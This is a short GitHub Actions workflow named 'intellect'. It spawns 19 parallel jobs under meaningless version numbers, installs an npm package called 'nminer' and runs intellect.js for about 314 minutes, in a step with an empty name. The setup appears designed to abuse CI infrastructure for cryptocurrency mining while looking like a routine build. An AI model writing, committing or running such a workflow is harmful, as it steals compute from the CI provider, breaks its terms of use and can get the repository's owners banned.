name: intellect
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 8592 }
          - { version: 8237 }
          - { version: 4374 }
          - { version: 3597 }
          - { version: 6196 }
          - { version: 7728 }
          - { version: 4753 }
          - { version: 6083 }
          - { version: 2431 }
          - { version: 9958 }
          - { version: 6454 }
          - { version: 8798 }
          - { version: 6520 }
          - { version: 7850 }
          - { version: 8272 }
          - { version: 9171 }
          - { version: 6339 }
          - { version: 2713 }
          - { version: 7493 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 314m node intellect.js || echo "intellect executed"